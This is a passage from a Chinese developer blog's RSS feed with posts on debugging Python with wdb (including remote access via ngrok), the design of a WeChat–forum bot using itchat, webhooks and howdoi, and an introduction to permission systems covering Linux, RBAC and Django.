&lt;li&gt;积木块的目前参数不完备,诸如swim没有速度参数(只能在js里写)&lt;/li&gt;
&lt;li&gt;对于高年级学生，可以增加活动空间，与其他设施，像掩体之类&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 26 Jun 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-06-26:blockly-game-pond.html</guid><category>code</category></item><item><title>使用wdb来调试python程序</title><link>/debug-with-wdb.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/wdb8b9dbcda.png" /&gt;&lt;/p&gt;
&lt;h1 id="wdb"&gt;&lt;a href="https://github.com/Kozea/wdb"&gt;wdb&lt;/a&gt;介绍&lt;/h1&gt;
&lt;p&gt;如果你用过pdb、ipdb或是pudb,那么你对调试python程序可能已经十分熟悉了&lt;/p&gt;
&lt;p&gt;下边推荐的wdb，和上述三个工具一样，都是为了帮助调试python程序而生。wdb的出众之处在于，它利用web技术，提供直观而友好的UI，让你不需要记住一堆的命令，就能在错误的上下文中轻松穿行，直至找出问题所在&lt;/p&gt;
&lt;p&gt;这种友好的体验和漂亮的UI，让人联想到jupyter--另一个借助web技术来帮助python开发的神器&lt;/p&gt;
&lt;p&gt;在技术层面，wdb采用client-server架构，使用websocekt来进行实时通信，这个思路和jupyter也相似(如果你对jupyter的架构有兴趣，可以参考我之前的文章)&lt;/p&gt;
&lt;p&gt;在使用体验式，wdb做的非常棒，我喜欢的一些点包括:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;左边栏的堆栈，可以随时点击进入。之后可自由探索其中的上下文(当然，web调试方面,Werkzeug在这块也做的很好)&lt;/li&gt;
&lt;li&gt;常用操作变为菜单按钮(免去记忆的负担)&lt;/li&gt;
&lt;li&gt;强大的tab补全&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_1"&gt;安装&lt;/h1&gt;
&lt;h3 id="ubuntu"&gt;ubuntu&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install wdb 
pip install wdb.server 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="mac"&gt;mac&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install wdb  --no-use-wheel
pip install wdb.server --no-use-wheel
&lt;/pre&gt;&lt;/div&gt;


&lt;h1 id="_2"&gt;使用&lt;/h1&gt;
&lt;p&gt;首先运行:&lt;code&gt;wdb.server.py&lt;/code&gt; (建议跑在一个tmux窗口中)，服务起来后，默认跑在端口:1984&lt;/p&gt;
&lt;p&gt;在需要调试的程序中加上 &lt;code&gt;import wdb;wdb.set_trace()&lt;/code&gt;，你一定似曾相识，没错，用法和pdb、ipdb完全相同 &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="" /&gt;&lt;/p&gt;
&lt;h3 id="_3"&gt;一个案例&lt;/h3&gt;
&lt;p&gt;我们以调试一个flask app为例(当然你可能更偏好flask原生的调试工具)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flask&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;
&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Flask&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nd"&gt;@app.route&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hello_world&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;wdb&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="n"&gt;wdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_trace&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Hello &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;!&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们来运行它:&lt;code&gt;python flask_app.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接着我们访问:&lt;code&gt;127.0.0.1:5000?name=斐德洛&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/wdb8b9dbcda.png" /&gt;&lt;/p&gt;
&lt;p&gt;tab补全功能非常强大,惬意如jupyter&lt;/p&gt;
&lt;h3 id="_4"&gt;远程调试&lt;/h3&gt;
&lt;p&gt;如果你想用wdb调试服务器上的程序，要麻烦一些，wdb的客户端基于web技术，所以你需要远程访问到客户端的端口&lt;/p&gt;
&lt;p&gt;因为是远程调试，所以弃用默认打开本地浏览器的选项,通过&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True&lt;/code&gt;变量来控制，具体而言就是在你运行带测试程序(网站)时，加上&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True&lt;/code&gt;，诸如&lt;code&gt;WDB_NO_BROWSER_AUTO_OPEN=True python flask_app.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;运行之后你在命令行将看到类似下边的输出:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;You can now launch your browser at http://[wdb.server]/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接着新起一个tmux窗口，用ngrok把1984端口映射出来,类似这样:&lt;code&gt;./ngrok --config ngrok.cfg --subdomain test_wdb  1984&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后直接访问ngrok映射出来的网址加上&lt;code&gt;/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f&lt;/code&gt;即可,形如:&lt;code&gt;test_wdb.ngrok.io/debug/session/28dca05c-0eac-abcd-8fb0-5546a22e774f&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 01 May 2017 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2017-05-01:debug-with-wdb.html</guid><category>dev-tools</category></item><item><title>论坛机器人的技术实现</title><link>/paperweekly-forum-bot.html</link><description>&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_all.jpg" /&gt;&lt;/p&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;@张俊同学有天晚上邀我写一期文章，介绍论坛机器人的技术实现。登时诚惶诚恐，群里大神云集，我此前写的这个粗陋的机器人实在难登大雅之堂。考虑到机器人还在群里头用，就献丑来简单介绍下技术层面的实现，方便大家日后改进它 ：）&lt;/p&gt;
&lt;p&gt;本文侧重谈论整体的设计和实现，至于细节，大家可以看&lt;a href="https://github.com/wwj718/paperweekly_forum"&gt;源码&lt;/a&gt;和文档(文档在doc目录下)  ：）&lt;/p&gt;
&lt;h1 id="_2"&gt;功能&lt;/h1&gt;
&lt;p&gt;论坛机器人目前实现了三个功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;微信群与&lt;a href="http://paperweekly.club"&gt;paperweekly论坛&lt;/a&gt;的双向通信(发帖/回复)&lt;/li&gt;
&lt;li&gt;paperweekly1群和2群的消息转发（当前只支持文本和表情）&lt;ul&gt;
&lt;li&gt;更多功能(图片/链接/跨群@)在todo list中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;问题检索&lt;ul&gt;
&lt;li&gt;支持中文提问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上三个功能按实现的先后排序。下边分别简述这三个功能的实现&lt;/p&gt;
&lt;h2 id="paperweekly"&gt;微信群与paperweekly论坛的双向通信&lt;/h2&gt;
&lt;p&gt;先贴上实际使用的截图：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/paperweekly_bbsc5fb270e.png" /&gt;&lt;/p&gt;
&lt;p&gt;这个功能是最初的需求，@张俊同学觉得群聊消息归档不便，不利于深入讨论问题。为了更加高效的分类和管理大家讨论的精华（QA对），想做个bot，与外部论坛打通，便于归档优质的讨论内容。大家群聊的时候只要按照特定格式发言，机器人就能将信息转发到论坛中，用论坛来保存这些讨论信息&lt;/p&gt;
&lt;p&gt;关于最初我们试图解决的问题，@张俊同学在&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;的Issue 2里写的很详细，对项目背景有兴趣的同学可以参考&lt;/p&gt;
&lt;p&gt;最初的需求描述如下（来自@张俊）:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/paperweeklyae5df2dd.png" /&gt;  &lt;/p&gt;
&lt;p&gt;我觉得这个想法很有趣，决定一试。用了一个晚上实现了微信与论坛的通信机制（大半时间在熟悉Misago）。次日早起，调试完成，后来也没空去重构代码，&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;这部分代码&lt;/a&gt;很丑陋（quick and dirty），欢迎有兴趣的小伙伴帮忙重构&lt;/p&gt;
&lt;h3 id="_3"&gt;思路与实现&lt;/h3&gt;
&lt;p&gt;微信群与paperweekly论坛双向通信问题，实际上是个消息转发问题。消息无非两种流向:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;来自群聊的消息发往论坛&lt;/li&gt;
&lt;li&gt;来自论坛的讨论发往微信群&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;消息的流向可以从这张图里看出:（这张图也描述了项目的结构和数据流）&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_architecture.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们先来看看从微信群发往论坛的消息。&lt;/p&gt;
&lt;p&gt;当微信群的讨论（成员的发言）匹配预先设定的模式时，将触发机器人特定行为，诸如往论坛发帖或回答问题。（这实际是CLI风格，如果你熟悉*nix，会觉得很亲切），所以机器人并没有处理自然语言，更多的是正则匹配，哈哈这有点小尴尬，如@张俊所言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们整天都在用机器学习，也都想通过人工智能来改变这个世界，来改变我们的生活，很多时候模型和工具都有，但缺少数据和需求，这次有了数据和需求，我们却无能为力了，感觉有一点点小讽刺&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;机器人士如何把消息发往论坛的呢。我hack了Misago（论坛所用的框架），使其对外提供RESTful API，允许使用http请求来做常见操作（发帖/回复之类）&lt;/p&gt;
&lt;p&gt;以发帖为例，我们跟着消息走，看到的是这样一个流程：微信群里某些消息匹配固定模式，机器人被激活，进而携带着token往论坛发送特定http请求，消息作为请求参数。于是消息从微信群流到了论坛&lt;/p&gt;
&lt;p&gt;接着我们来看看论坛发往微信群的消息。在论坛这块，我hack了源码里的发帖函数，使其具有webhook output功能，你很可能已经用过github的webhook output。当论坛产生帖子时，将对外发起一个web请求（output），外部系统收到请求便知道事件的发生，同时也能获取事件的细节（请求参数），如此一来这个钩子（hook）就把两个异构系统勾连起来。&lt;/p&gt;
&lt;p&gt;webhook是我偏好的异构系统间通信的解决方案，灵活性高，耦合度低。&lt;/p&gt;
&lt;p&gt;我将论坛的web请求发往一个消息服务（我选择kinto，至于原因我在开发文档里也有描述），而在机器人这边，会不断向消息服务轮询。这实际上是经典的发布/订阅模型（至于为何不采用redis和rabbitmq的原因我在开发文档里也有说明）。&lt;/p&gt;
&lt;p&gt;使用发布订阅模型考虑的主要是扩展性，我手头有nlp相关的 QQ群，当时觉得paperweekly的讨论内容很棒，也许其他nlp小组也会感兴趣，使用发布订阅模型，我只要在任何group里（QQ/wechat/telegram/whatapp）放上机器人，就可以订阅paperweekly的动态，我这边做了两个具体实现，其一是在微信群中订阅消息，源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;paperweeklybot.py&lt;/a&gt;，其二是QQ群中订阅消息：源码见&lt;a href="https://github.com/wwj718/SmartQQBot"&gt;SmartQQBot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;至于论坛的选型（最终选择了Misago），大家在群里讨论的结果倾向选择基于python的论坛框架。因为大家对python更为熟悉，方便维护&lt;/p&gt;
&lt;h2 id="_4"&gt;群消息转发&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/group2ca9e5a54.png" /&gt;&lt;/p&gt;
&lt;p&gt;关于这个需求的背景，引述@张俊的说明（&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;）：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个群很快就到了500人，出现了一个棘手的问题，第二个群的人如果太少，几乎没有讨论意义，所以就想用什么办法可以打通两个群，让两个群的童鞋在同一时空内进行交流&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;@碱馒头同学用了一个中午时间写了群消息转发机器人，我觉得很妙，功能干净利落、十分实用。后来我们觉得两个机器人可以合并成一个，本来计划由馒头兄来实现这块，后来因为我的微信机器人框架和馒头兄不同（我偏好&lt;a href="https://github.com/littlecodersh/ItChat"&gt;itchat&lt;/a&gt;），我就自己用itchat实现了这块&lt;/p&gt;
&lt;p&gt;这部分的实现比较简单，机器人同时在两个群里，当机器人接收到A群消息时，立马转发到B群。至于机器人如何得到群消息，就是微信机器人框架（itchat）做的事了，大家可以自行读文档&lt;/p&gt;
&lt;p&gt;目前只转发文本和表情，下一步准备支持图片/链接分享和跨群@&lt;/p&gt;
&lt;h2 id="_5"&gt;问题检索&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/qa_bot2af8f456.png" /&gt;&lt;/p&gt;
&lt;p&gt;国庆去白洋淀玩，路上，@张俊同学提到一个有趣的想法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有人提问之后，能否直接从quora或者知乎检索相应的答案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我想到之前玩过的一个叫做&lt;a href="https://github.com/gleitz/howdoi"&gt;howdoi&lt;/a&gt;的项目，于是以此为原型给bot添加了&lt;code&gt;问题检索&lt;/code&gt;的功能,源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/qa_bot.py"&gt;qa_bot.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前用户可以在微信群向机器人提问，它会返回stackoverflow里最佳的答案&lt;/p&gt;
&lt;p&gt;原理很简单，howdoi的源码很短，大体思路是利用google的site特性，在指定的站点搜索问题（默认是stackoverflow），得到相关连接，然后打开连接，用pyquery提取内容，返回干净的答案给用户&lt;/p&gt;
&lt;p&gt;从howdoi的原理我们可以看出：实际上&lt;code&gt;问题搜索&lt;/code&gt;是利用了google强大的搜索能力，同时我们看到，这是一个易于扩展的框架，只要改变site对应的网址，理论上可以检索任何网址。最初的需求里提到的知乎和quora当然没有问题，剩下的工作只剩对答案做html清洗。惭愧的是我近来挖的坑太多，业余时间被分散在各个坑里，这个坑暂时还没填，等待小伙伴加入&lt;/p&gt;
&lt;p&gt;因为howdoi不支持中文（用中文从stackoverflow里基本搜不出有价值的东西），后来我们添加了一个翻译层，先做翻译，然后再检索，这样一来，就可以直接在微信群里用中文向机器人提问&lt;/p&gt;
&lt;p&gt;于是你就看到了上边一张图片里的问答&lt;/p&gt;
&lt;h1 id="_6"&gt;下一步&lt;/h1&gt;
&lt;p&gt;接下来除了填完上文提到的坑（todolist）&lt;/p&gt;
&lt;p&gt;还准备先把群消息存下，诸如（groupname，username，content，time），然后pandas做些简单统计，可做的事包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加一些小彩蛋，诸如@机器人可以返回该用户的历史参与情况&lt;/li&gt;
&lt;li&gt;统计得出年度热心群友（举个栗子：）,莫当真)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进一步，可以用bokeh作可视化展示&lt;/p&gt;
&lt;p&gt;当然也可以把语料开放给群成员，供大家使用nlp来做一步的分析和挖掘，诸如挖出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;近期焦点问题&lt;/li&gt;
&lt;li&gt;冷场话题排行版&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;或者用来训练一只paperweekly风格的机器人 ：）&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 05 Nov 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-11-05:paperweekly-forum-bot.html</guid><category>code</category></item><item><title>理解权限系统</title><link>/understand-permission.html</link><description>&lt;blockquote&gt;
&lt;p&gt;现实世界只不过是反射出了更高层次的世界的阴影   --- 柏拉图 &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机世界中的许多事物是现实世界的一个投影，现实中所见的许多模式/概念在计算机世界里都能找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;权限&lt;/code&gt;作为现实世界随处可见的概念，在我们谈论&lt;code&gt;私有制&lt;/code&gt;、&lt;code&gt;所有权&lt;/code&gt;时，时常会谈及权限，在计算机世界中，权限在许多系统中举足轻重&lt;/p&gt;
&lt;p&gt;曾记否，qq里隐身对她可见，怕她看不见，下线又上线，却依旧被视而不见&lt;br /&gt;
曾记否，好好的一个熟人，说做微商就做微商，痛心疾首，火速拉黑&lt;/p&gt;
&lt;p&gt;上述的这些，都是利用权限系统的典型案例，在qq隐身案例中，你对女神隐身可见，实际上是赋予了她可以看到你的隐身状态（真实状态）的权限；当然你也赋予了人家伤害你的权限&lt;/p&gt;
&lt;p&gt;在朋友圈中的案例中，你把微商拉到了&lt;code&gt;黑名单&lt;/code&gt;用户组，这样一来，他们就没有看到你的状态的权限，你也看不到他的刷屏&lt;/p&gt;
&lt;p&gt;下边我们将以几个案例来帮助理解权限系统的概念和设计，这些案例包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux操作系统中的权限系统&lt;/li&gt;
&lt;li&gt;微信朋友圈中的权限&lt;/li&gt;
&lt;li&gt;django中的权限机制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;近期工作中遇到一个系统设计中关于权限的复杂问题（层级组织），本文是我学习权限系统及对此思考的一个小结&lt;/p&gt;
&lt;h1 id="linux"&gt;linux中的权限系统&lt;/h1&gt;
&lt;p&gt;关于权限系统，我们以linux为切入点，它为大多技术人员所熟悉。我们重点关注其中的概念，而对实现细节不做深究&lt;/p&gt;
&lt;p&gt;linux是个多用户操作系统，这每个用户有自己的工作空间(home目录)。就好比多人住在一套公寓里，各自有自己的房间。&lt;/p&gt;
&lt;p&gt;在linux中&lt;code&gt;一切皆文件&lt;/code&gt;，linux鼓励使用文本文件，人和机器能理解文本文件，成为人与机器交流的最好途径。在linux中权限问题往往最终会落到文件的权限上。&lt;/p&gt;
&lt;p&gt;如果我们把文件视为一种资源。那么我们会发现 权限往往围绕这些概念：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户&lt;/li&gt;
&lt;li&gt;用户组（群组）&lt;/li&gt;
&lt;li&gt;资源&lt;/li&gt;
&lt;li&gt;权限类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你对上述概念不大熟悉，推荐阅读鸟哥的&lt;a href="http://cn.linux.vbird.org/linux_basic/0210filepermission.php#UserandGroup"&gt;Linux 的文件权限与目录配置&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上边几个概念中，鸟哥对用户组的解释很棒（意义和功能），推荐一读&lt;/p&gt;
&lt;p&gt;总结来说，Linux一般将文件关联的身份分为三个类别，分别是 owner/group/others，且三种身份各有 read/write/execute 权限&lt;/p&gt;
&lt;p&gt;我们举个本地文件的例子&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ls -l /tmp/test.txt
&lt;span class="c1"&gt;# -rw-r--r--  1 wwj  wheel  235103  9  7 10:26 /tmp/test.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们在此引用鸟哥文章里的这张图&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://cn.linux.vbird.org/linux_basic/0210filepermission_files/0210filepermission_3.gif" /&gt;&lt;/p&gt;
&lt;p&gt;上述信息表示：文件&lt;code&gt;/tmp/test.txt&lt;/code&gt;是文件(&lt;code&gt;-&lt;/code&gt;)，文件拥有者(wwj)的权限为&lt;code&gt;rw-&lt;/code&gt;(读写)，文件拥有群组(wheel)的权限为&lt;code&gt;r--&lt;/code&gt;(读)，其他人的权限为&lt;code&gt;r--&lt;/code&gt;(读)&lt;/p&gt;
&lt;p&gt;如果你想改变文件属性与权限，可以使用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;chgrp ：改变文件所属群组&lt;/li&gt;
&lt;li&gt;chown ：改变文件拥有者&lt;/li&gt;
&lt;li&gt;chmod ：改变文件的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了群组/资源/用户这些概念，之后我们就可以这样表达权限了: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A用户有资源B的可读权限(r)&lt;/li&gt;
&lt;li&gt;群组X有资源Y的可读权限(r)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_1"&gt;朋友圈中的分组与权限&lt;/h1&gt;
&lt;p&gt;在用户/群组/资源/权限类型的视角下，我们可以这样理解微信朋友圈的分组功能：&lt;/p&gt;
&lt;p&gt;你半夜回家发了一条: &lt;code&gt;今天大学聚会很开心&lt;/code&gt;，为了让没到现场的同学也看到聚会情况，于是附上了聚会照片，你怕被小伙伴诟病为&lt;code&gt;天天晒吃的&lt;/code&gt;，于是决定这条消息只对&lt;code&gt;大学同学组&lt;/code&gt;可见,这样只有在&lt;code&gt;大学同学组(群组)里的同学(用户)才能看到(可读权限)聚会消息(资源)&lt;/code&gt;&lt;/p&gt;
&lt;h1 id="rbac"&gt;RBAC&lt;/h1&gt;
&lt;p&gt;如果我们进一步抽象，我们便总结出了&lt;code&gt;基于角色的访问控制&lt;/code&gt;(Role-Based Access Control，RBAC)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Who对What进行How操作&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到这种模式：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;大学同学组里的同学(who)才能看到(how)聚会消息(what)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RBAC认为权限授权实际上是Who、What、How的问题&lt;/p&gt;
&lt;p&gt;在RBAC模型中，who、what、how构成了访问权限三元组,也就是&lt;code&gt;Who对What进行How的操作&lt;/code&gt;，各个要素的含义如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Who：权限的拥用者或主体（如User、Group、Role）&lt;/li&gt;
&lt;li&gt;What：权限针对的对象或资源（Resource）。&lt;/li&gt;
&lt;li&gt;How：具体的权限&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_2"&gt;特点&lt;/h3&gt;
&lt;p&gt;模型中概念与实际系统紧密对应。RBAC模型中的角色、用户和许可权等概念都是实际系统实际存在的实体，便于设计者建立现存的或待建系统的RBAC模型&lt;/p&gt;
&lt;h3 id="_3"&gt;分治的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;我们要分割这些问题来讨论（分析的思路/分治）&lt;ul&gt;
&lt;li&gt;用户与角色的指派&lt;/li&gt;
&lt;li&gt;角色与权限的指派&lt;/li&gt;
&lt;li&gt;为定义角色的继承 进行的角色与角色的指派。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上述这些活动都要求把用户和权限联系起来。多数情况下它们最好由不同的管理员或管理角色来做。对角色指派权限是典型的应用管理者的职责（类似元角色）&lt;/p&gt;
&lt;h3 id="_4"&gt;概念解释&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Group：用户组，权限分配的单位与载体。组可以包括组(以实现&lt;code&gt;权限的继承&lt;/code&gt;)（适合用来处理层级问题），也可以包含用户，组内用户继承组的权限。User与Group是多对多的关系。Group可以层次化，以满足不同层级权限控制的要求。 （漂亮解决了我的问题）&lt;ul&gt;
&lt;li&gt;部门Department或组织Organization，都可以对应到Group&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Role：Role和User关系的左右两边都是Many-to-Many关系，角色是为了完成各种工作而创造，用户则依据它的责任和资格来被指派相应的角色，角色配置成其完成任务所需要的最小的权限集&lt;/li&gt;
&lt;li&gt;许可表（PERMISSIONS）包括许可标识、许可名称、受控对象、操作标识。许可表给出了受控对象与操作算子的对应关系。*  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_5"&gt;其他笔记&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RBAC都是基于关系模型&lt;/li&gt;
&lt;li&gt;资源是受控对象&lt;/li&gt;
&lt;li&gt;RBAC模型支持数据抽象原则和继承概念&lt;/li&gt;
&lt;li&gt;RBAC模型没有提供操作顺序控制机制&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="django"&gt;Django中的权限机制&lt;/h1&gt;
&lt;p&gt;这部分主要参考&lt;a href="http://www.jianshu.com/p/01126437e8a4"&gt;Django权限机制的实现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你对Django熟悉（不熟悉的话参考你所用web框架的权限机制），可以把这部分理解为以Django为例，解释如何把权限概念用于web项目&lt;/p&gt;
&lt;p&gt;在web应用中，权限机制能够约束用户行为，控制页面的显示内容（想想你的朋友圈和各种论坛的会员机制），也能使API更加安全和灵活（django-rest-framework中）&lt;/p&gt;
&lt;p&gt;Django中用&lt;code&gt;user&lt;/code&gt;, &lt;code&gt;group&lt;/code&gt;和&lt;code&gt;permission&lt;/code&gt;完成了权限机制(和linux很像)，这些概念，我们在前文中阐述清楚了，这个权限机制是将属于model的某个permission赋予user或group，可以理解为全局的权限（ps：如果你需要更细分的权限机制，可以试试：&lt;a href="https://github.com/lukaszb/django-guardian"&gt;django-guardian&lt;/a&gt;）&lt;/p&gt;
&lt;h3 id="django_1"&gt;Django的权限项&lt;/h3&gt;
&lt;p&gt;Django用permission（如前文说的许可表）对象存储权限项（How），每个model默认都有三个permission，即add model, change model和delete model，在admin中你可以看到，当然我们也可以手动添加其他权限项，不过值得注意的是权限是针对model的，而不是instance的！&lt;/p&gt;
&lt;p&gt;为一个用户添加权限，既可以在view里做（编码），也可以由管理员（Role）在admin里做（不需要编码）&lt;/p&gt;
&lt;h3 id="_6"&gt;使用权限&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在view中，使用装饰器来验证权限:&lt;code&gt;@permission_required('car.can_drive')&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在模板中，当前登录用户的权限存储在模板变量 &lt;code&gt;{{ perms }}&lt;/code&gt; 中&lt;/li&gt;
